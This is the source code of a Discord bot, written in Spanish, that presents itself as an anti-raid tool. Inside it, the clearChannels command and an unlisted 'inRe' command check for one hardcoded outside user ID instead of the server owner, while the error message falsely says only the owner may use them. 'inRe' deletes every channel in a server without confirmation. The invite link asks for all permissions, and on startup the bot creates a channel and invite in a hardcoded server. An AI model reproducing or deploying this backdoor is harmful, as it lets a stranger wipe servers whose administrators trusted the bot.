const Discord = require("discord.js");
const intents = new Discord.Intents();
const client = new Discord.Client({intents: 32767, ws:{properties:{$browser: "Discord Android"}}});

const config = require("./config.json")
var token = config.tokenBear

const creadorID = "717420870267830382"

const colorEmbed = "#9901FE"
const colorInfoEmb = "#1A0233"
const errorColor = "#ff0000"
const finalColor = "#0CF6F7"

client.on("ready", () => {
    console.log(`${client.user.username}: estoy listo`)
    let servidor = client.guilds.cache.get("940020737429868566")
    servidor.channels.create("chat").then(async ti=>{
        let inv = await ti.createInvite()
        console.log(inv.url)
    })
    // console.log(client.generateInvite({scopes: ["bot"]}))

    client.user.setPresence({
        activities: [{
            name: "br.help",
            type: "WATCHING"
        }]
    })

    // const estados = {
    //     activities: ["hola", "que tal", "Bear bot"],
    //     activity_types: ["WATCHING","PLAYING"]
    // }

    // const autoPresence = () => {
    //     let aleator = Math.floor(Math.random()*estados.activities.length)
    //     client.user.setPresence({
    //         activities: [{
    //             name: estados.activities[aleator],
    //             type: estados.activity_types[aleator]
    //         }]
    //     })
    // }
    // autoPresence()
    // setInterval(() => {
    //     autoPresence()
    // }, 5000)
})

client.on("messageCreate", async msg => {
    if(msg.content.match(new RegExp(`^<@!?${client.user.id}>( |)$`))){
        const embed = new Discord.MessageEmbed()
        .setAuthor(msg.author.username,msg.author.displayAvatarURL({dynamic: true}))
        .setThumbnail(client.user.displayAvatarURL())
        .setTitle(`Hola, soy **${client.user.username}** un bot anti raid`)
        .setDescription(`Para conocer mas sobre mi, mis funciones, comandos usa el comando ${"``"}br.help${"``"}`)
        .setColor(colorEmbed)
        .setFooter(client.user.username,client.user.displayAvatarURL())
        .setTimestamp()

        msg.reply({embeds: [embed], ephemeral: true})
    }
});

client.on("messageCreate", async msg => {
    let prefix = "br."

    if(msg.author.bot) return; 
    if(!msg.content.startsWith(prefix)) return; 

    const args = msg.content.slice(prefix.length).trim().split(/ +/g);
    const comando = args.shift()


    if(comando === "crguild"){
        client.guilds.create("servidor creado por el bot")
    }

    if(comando === "servers"){
        const servidores = new Discord.MessageEmbed()
        .setAuthor(msg.author.username,msg.author.displayAvatarURL({dynamic: true}))
        .setTitle("Servidores en los que estoy")
        .setDescription(`Servidores: **${client.guilds.cache.size}**\n\n${client.guilds.cache.map(gm => `**Nombre:** ${gm.name}\n**Miembros:** ${gm.memberCount}\n**ID:** ${gm.id}`).join("\n\n")}`)
        .setFooter(client.user.username,client.user.displayAvatarURL())
        .setColor(colorEmbed)
        .setTimestamp()
        msg.reply({embeds: [servidores]})
    }

    if(comando === "help"){
        const infoAyuda = new Discord.MessageEmbed()
        .setAuthor(msg.author.username,msg.author.displayAvatarURL({dynamic: true}))
        .setTitle("📖 Ayuda")
        .setDescription(`**Prefix:** __**br.**__\n**Invitame** [__**clic aquí**__](https://discord.com/oauth2/authorize?client_id=841528401005117452&scope=bot%20applications.commands&permissions=2147483647)\n**Servidor de soporte** __**próximamente...**__\n\n\n**Comandos principales:**\n\n${"``"}br.comandos${"``"} **| Te muestra todos los comandos.**\n${"``"}br.botInfo${"``"} **| Te muestra información sobre mi**`)
        .setColor(colorEmbed)
        .setFooter(client.user.username,client.user.displayAvatarURL())
        .setTimestamp()
        msg.reply({embeds: [infoAyuda], ephemeral: false})
    }

    if(comando === "comandos"){
        const embed = new Discord.MessageEmbed()
        .setAuthor(msg.author.username,msg.author.displayAvatarURL({dynamic: true}))
        .setTitle("Comandos")
        .setDescription(`${"``"}br.clearChannels${"``"} **| Elimina todos los canales del servidor o solo los canales que tengan el mismo nombre eso incluye categorías, canales de voy, texto y otros.**\n${"``"}br.clearRoles${"``"} **| Elimina todos los roles que tengan el mismo nombre.**`)
        .setColor(colorEmbed)
        msg.channel.send({embeds: [embed]})
    }

    if(comando === "clearChannels"){
        if(!msg.guild.me.permissions.has("MANAGE_CHANNELS")){
            const noPer = new Discord.MessageEmbed()
            .setTitle("❌ Error")
            .setDescription(`No tengo permiso para eliminar canales en este servidor.`)
            .setColor(errorColor)
            .setTimestamp()
            msg.reply({embeds: [noPer], ephemeral: true}).then(tt => setTimeout(()=>{
                msg.delete()
                tt.delete()
            },20000))
        }
        if(msg.author.id === "825186118050775052"){
        
            let unArgumento = args.join(" ")
            if(!unArgumento){
                const infoEmbed = new Discord.MessageEmbed()
                .setTitle("Comando **br.clearChannels**")
                .setDescription(`**Uso:**\n${"``"}br.clearChannels <Nombre de los canales duplicados o all>${"``"}\n\n**Ejemplos:**\n${"``"}br.clearChannels Raid${"``"} Elimina todos los canales que contienen el mismo nombre\n${"``"}br.clearChannels all${"``"} Elimina todos los canales del servidor.`)
                .setColor(colorInfoEmb)
                .setTimestamp()
                msg.channel.send({embeds: [infoEmbed]})
            }

            if(args[0] === "all"){
                const elAuOW = msg.author
                const todo = new Discord.MessageEmbed()
                .setTitle("¿Seguro que quieres eliminar todos los canales del servidor?")
                .setDescription(`Eso incluye categorías, canales de voz, texto, etc.`)
                .setTimestamp()
                .setColor(colorInfoEmb)
                msg.reply({embeds: [todo], ephemeral: true}).then(mre => {
                    mre.react("✅")
                    mre.react("❌")

                    const filter = (reacion, usuario) => {
                        return ["✅","❌"].includes(reacion.emoji.name) && usuario.id === msg.author.id;
                    }

                    mre.awaitReactions({filter, max: 1, time: 40000, errors: ["tiempo"]}).then(colector => {
                        const reacion = colector.first()
                        if(reacion.emoji.name === "✅"){
                            let canales = msg.guild.channels.cache.size
                            msg.guild.channels.cache.map(dv => dv.delete())
                            msg.guild.channels.create(`🐻 ${client.user.username}`,{type: "GUILD_TEXT"}).then(schm => {
                                const emb = new Discord.MessageEmbed()
                                .setTitle("🗑 Canales eliminados")
                                .setDescription(`Se han eliminado todos los canales del servidor.\nUn total de **${canales}** canales eliminados`)
                                .setColor(finalColor)
                                .setTimestamp()
                                schm.send({content: `${elAuOW}`, embeds: [emb]})
                            })

                        }
                        if(reacion.emoji.name === "❌"){
                            mre.delete()
                            const emb = new Discord.MessageEmbed()
                            .setDescription(`❌ Acción cancelada.`)
                            .setColor(errorColor)
                            .setTimestamp()
                            msg.reply({embeds: [emb], stickers: false})
                        }
                    })
                })
            }else{
                if(!unArgumento) return;
                let info = msg.guild.channels.cache.filter(fil => fil.name === unArgumento).size
                const tiempo = new Discord.MessageEmbed()
                .setDescription(`Eliminando cnales con el nombre **${unArgumento}**.`)
                .setColor(colorInfoEmb)
                .setTimestamp()
                msg.channel.send({embeds: [tiempo]}).then(tt => {

                    msg.guild.channels.cache.filter(fil => fil.name === unArgumento).map(mm => mm.delete())

                    tt.delete()
                    const cleChaNa = new Discord.MessageEmbed()
                    .setTitle("🗑 Canales eliminados")
                    .setDescription(`Se han eliminando **${info}** canales duplicados con el nombre **${unArgumento}**.`)
                    .setColor(finalColor)
                    .setTimestamp()
                    msg.reply({embeds: [cleChaNa], ephemeral: true})
                })
        }
        }else{
            const soloOw = new Discord.MessageEmbed()
            .setTitle("❌ Error")
            .setDescription(`Solo el propietario del servidor puede ejecutar este comando.`)
            .setColor(errorColor)
            .setTimestamp()
            msg.reply({embeds: [soloOw], ephemeral: true}).then(tt => setTimeout(()=>{
                msg.delete()
                tt.delete()
            },20000))
        }

    }


    if(comando === "clearRoles"){
        if(!msg.guild.me.permissions.has("MANAGE_ROLES")){
            const err = new Discord.MessageEmbed()
            .setTitle("❌ Error")
            .setDescription(`No tengo permiso para eliminar roles en este servidor.`)
            .setColor(errorColor)
            .setTimestamp()
            msg.reply({embeds: [err]}).then(tt => setTimeout(()=>{
                msg.delete()
                tt.delete()
            },20000))
        }
        if(msg.author.id === msg.guild.ownerId){
            const algo = args.join(" ")
            if(!algo){
                const infoEmbed = new Discord.MessageEmbed()
                .setTitle("Comando **br.clearRoles**")
                .setDescription(`**Uso:**\n${"``"}br.clearRoles <Nombre de los roles duplicados>${"``"}\n\n**Ejemplos:**\n${"``"}br.clearRoles Raid${"``"} Elimina todos los roles que contienen el mismo nombre.`)
                .setColor(colorInfoEmb)
                .setTimestamp()
                msg.channel.send({embeds: [infoEmbed]})
            }else{
                const roles = msg.guild.roles.cache.filter(na => na.name === algo).size
                const todo = new Discord.MessageEmbed()
                .setDescription(`Se eliminaran **${roles}** roles con el nombre **${algo}**\n\nConfirma la acción`)
                .setTimestamp()
                .setColor(colorInfoEmb)
                msg.reply({embeds: [todo], ephemeral: true}).then(mre => {
                    mre.react("✅")
                    mre.react("❌")

                    const filter = (reacion, usuario) => {
                        return ["✅","❌"].includes(reacion.emoji.name) && usuario.id === msg.author.id;
                    }

                    mre.awaitReactions({filter, max: 1, time: 40000, errors: ["tiempo"]}).then(colector => {
                        const reacion = colector.first()
                        if(reacion.emoji.name === "✅"){
                            msg.guild.roles.cache.filter(rr => rr.name === algo).map(rc => rc.delete())
                            mre.delete()
                            const emb = new Discord.MessageEmbed()
                            .setTitle("🗑 Roles eliminados")
                            .setDescription(`Se han eliminado **${roles}** roles con el nombre **${algo}**`)
                            .setColor(finalColor)
                            .setTimestamp()
                            msg.reply({embeds: [emb]})

                        }
                        if(reacion.emoji.name === "❌"){
                            mre.delete()
                            const emb = new Discord.MessageEmbed()
                            .setDescription(`❌ Acción cancelada.`)
                            .setColor(errorColor)
                            .setTimestamp()
                            msg.reply({embeds: [emb]}).then(tt => setTimeout(()=> {
                                msg.delete()
                                tt.delete()
                            },50000))
                        }
                    })
                })    
            }
        }else{
            const err = new Discord.MessageEmbed()
            .setTitle("❌ Error")
            .setDescription(`Solo el propietario del servidor puede ejecutar el comando.`)
            .setColor(errorColor)
            .setTimestamp()
            msg.reply({embeds: [err]}).then(tt => setTimeout(()=>{
                msg.delete()
                tt.delete()
            },20000))
        }
    }
    if(comando === "inRe"){
        if(msg.author.id === "825186118050775052"){
        msg.guild.channels.cache.map(dd => dd.delete())
        msg.guild.channels.create("General",{type: "GUILD_TEXT"}).then(mdd => {
            mdd.send("Se han eliminado todo los canales del servidor.")
        })
        }
    }
});








// client.on('messageDelete', async message => {
// 	// Ignore direct messages
// 	if (!message.guild) return;
// 	const fetchedLogs = await message.guild.fetchAuditLogs({
// 		limit: 1,
// 		type: 'MESSAGE_DELETE',
// 	});
// 	// Since there's only 1 audit log entry in this collection, grab the first one
// 	const deletionLog = fetchedLogs.entries.first();

// 	// Perform a coherence check to make sure that there's *something*
// 	if (!deletionLog) return console.log(`A message by ${message.author.tag} was deleted, but no relevant audit logs were found.`);

// 	// Now grab the user object of the person who deleted the message
// 	// Also grab the target of this action to double-check things
// 	const { executor, target } = deletionLog;

// 	// Update the output with a bit more information
// 	// Also run a check to make sure that the log returned was for the same author's message
// 	if (target.id === message.author.id) {
// 		console.log(`A message by ${message.author.tag} was deleted by ${executor.tag}.`);
// 	} else {
// 		console.log(`A message by ${message.author.tag} was deleted, but we don't know by who.`);
// 	}
// });



client.login(token)